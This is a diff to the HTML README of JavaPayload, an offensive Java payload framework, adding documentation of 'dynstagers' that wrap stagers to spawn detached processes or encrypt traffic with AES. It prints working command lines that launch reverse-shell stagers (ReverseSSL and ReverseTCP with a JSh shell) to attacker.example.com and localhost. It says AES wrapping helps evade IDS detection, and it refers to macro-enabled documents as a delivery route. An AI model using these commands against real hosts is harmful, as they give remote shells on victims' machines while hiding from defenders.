@@ -100,6 +100,23 @@ will be dumped to disk (and deleted later), which may increase the risk of antiv
 other hand, in the main usage scenario for these stagers - Java applets - the applet has been stored to
 disk anyway (in the browser cache and/or the Java plugin cache).</p>
 
+<h3>Dynstagers</h3>
+
+<p>On several occasions (both included in JavaPayload and externally), stagers used to be generated
+dynamically based on other stagers by Java code that usually uses the ASM library to do so. As a consequence, 
+whenever you need such a stager, you will have to generate it and add it to the class path before you can use it.
+Additionally, every generated stager needs a generated stager handler as well, although the stager handler could
+usually have been handled by a generic class that holds a reference. In the 0.3 version, with introduction of
+AES payloads, the number of generated payloads that would have to be shipped with JavaPayload exploded. Therefore,
+a new concept of Dynstagers was introduced. A dynstager is basically stager whose name follows a specific syntax,
+and that will be generated based on another stager, a dynstager parameter and optionally the stager and stage
+arguments automatically in the background. It will be loaded into a in-memory classloader to be used (and maybe
+built into loaders) without additional user interaction.</p>
+
+<p>The general syntax of a dynstager name is <tt><i>dynstager</i>_<i>stager</i></tt>, or
+<tt><i>dynstager</i>$<i>arg</i>_<i>stager</i></tt>. <i>stager</i> is another stager that might include yet another
+dynstager (for constructions like <tt>Spawn_Spawn_AES_ReverseTCP</tt>), <i>arg</i> is an optional dynstager argument.</p>
+
 <h3>Stages</h3>
 
 <p>Stages are loaded by a stager and responsible for doing what you want to do on the victim's host (like provide a
@@ -169,6 +186,7 @@ making it possible to connect a ReverseTCP stager directly to a JDWPTunnel stage
 <li>Add BindUDP/ReverseUDP stagers</li>
 <li>Add AES stagers and an AES stage (for stagers that do not support it)</li>
 <li>New stages: ForwardTCP, GZIP, GZ, JCp, LaunchStager, LocalProxy, MultiStage, SendParameters</li>
+<li>Add the new concept of dynstagers, to avoid having to create dynamic stages manually.</li>
 </ul>
 
 <h2>Changes since version 0.1</h2>
@@ -268,6 +286,9 @@ the ASM libraries and/or the JDK's <tt>tools.jar</tt> have to be in the classpat
 <p><tt>java -jar ReverseSSL_JSh.jar ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
 <p>&mdash; or &mdash;</p>
 <p><tt>java -cp JavaPayload.jar javapayload.loader.StandaloneLoader ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+
+<p>If you want to use dynstagers without building a custom jar, use <tt>javapayload.loader.DynLoader</tt> instead of
+<tt>javapayload.loader.StandaloneLoader</tt>.</p>
 
 <h3>Standalone example (using custom-tailored JAR file with embedded parameters)</h3>
 
@@ -392,54 +413,37 @@ first:</p>
 
 <p>Open the document with OpenOffice and say "yes" when you are asked whether to execute macros.</p>
 
-<h3>Spawning stagers</h3>
+<h3>Spawning dynstager</h3>
 
-<p>For all the stagers included, there is already a pre-built spawning stager available, whose name is 
-prefixed by <tt>Spawn</tt>. They can be used like any other stagers, for example:</p>
+<p>JavaPayload includes a <tt>Spawn</tt> dynstager that can be used to dynamically generate stagers
+that spawn in a new process. They can be used like any other stagers, for example:</p>
 
-<p><tt>java javapayload.handler.stager.StagerHandler SpawnReverseTCP localhost # -- JSh</tt></p>
-<p><tt>java javapayload.loader.StandaloneLoader SpawnReverseTCP localhost 1687 -- JSh</tt></p>
-
-<p>To build spawning stagers for any number of other stagers, you can use a
-command like this:</p>
-
-<p><tt>java javapayload.builder.SpawnStagerBuilder SomeStager AnotherStager [...]</tt></p>
-
-<p>This will create a file called <tt>SpawnStagers.jar</tt> that contains new stagers whose names start
-with <tt>Spawn</tt>, like <tt>SpawnSomeStager</tt>. After adding them to the class path, you can use them
-like the already included stagers.</p>
+<p><tt>java javapayload.handler.stager.StagerHandler Spawn_ReverseTCP localhost # -- JSh</tt></p>
+<p><tt>java javapayload.loader.DynLoader Spawn_ReverseTCP localhost 1687 -- JSh</tt></p>
 
 <p>On some systems (like Windows), the parent process information is lost when the parent process dies.
 Therefore it can be useful to have a stager that spawns twice (so that the resulting child process it not
-associated to any living parent process). Therefore, stagers starting with <tt>SpawnSpawn</tt> are included
-for all built-in stagers. To achieve this for other stagers, just wrap them again:</p>
+associated to any living parent process). Therefore, you can wrap a stager twice:</p>
 
-<p><tt>copy SpawnStagers.jar SpawnStagers2.jar</tt></p>
-<p><tt>set CLASSPATH=SpawnStagers2.jar;%CLASSPATH%</tt></p>
-<p><tt>java javapayload.builder.SpawnStagerBuilder SpawnSomeStager SpawnAnotherStager</tt></p>
+<p><tt>java javapayload.loader.DynLoader Spawn_Spawn_ReverseTCP localhost 1687 -- JSh</tt></p>
 
-<h3>AES stagers</h3>
+<h3>AES dynstager</h3>
 
 <p>Java classes on the wire are quite easy to spot (and detect by an IDS); if they slip though,
 trying to chainload (UpExec) native executables might easily be detected. therefore it is
-often advisable to encrypt the whole communication with AES or similar. Therefore, a tool is included
-that can rewrite an existing stager to use AES instead (the name is prefixed by <tt>AES</tt> then). For
-all supported included stagers, AES stagers are already built (While it is not possible build an AES
-stager from a spawn stager, you can build a spawn stager from an AES stager, though).</p>
+often advisable to encrypt the whole communication with AES or similar. Therefore, an AES dynstager
+is included that can make almost every existing stager to use AES (While it is not possible to use 
+AES_Spawn_* dynstagers, you can use Spawn_AES_* dynstagers).</p>
 
 <p>To use them, add an additional argument <b>to the beginning</b> which is the password used
 to derive the AES key from. The protocol uses the <tt>AES/CFB8/NoPadding</tt> mode with
 random initialization vectors (prepended to the communication). Example:</p> 
 
-<p><tt>java javapayload.handler.stager.StagerHandler AESReverseTCP verysecret localhost # -- JSh</tt></p>
-<p><tt>java javapayload.loader.StandaloneLoader AESReverseTCP verysecret localhost 1687 -- JSh</tt></p>
+<p><tt>java javapayload.handler.stager.StagerHandler AES_ReverseTCP verysecret localhost # -- JSh</tt></p>
+<p><tt>java javapayload.loader.DynLoader AES_ReverseTCP verysecret localhost 1687 -- JSh</tt></p>
 
 <p>You can also give "#" as the password, which will print the password to stdout, like ports
 are handled with the ReverseTCP stager.</p>
-
-<p>To build more AES stagers:</p>
-
-<p><tt>java javapayload.builder.AESStagerBuilder SomeStager AnotherStager [...]</tt></p>
 
 <h3>AES stages</h3>
 
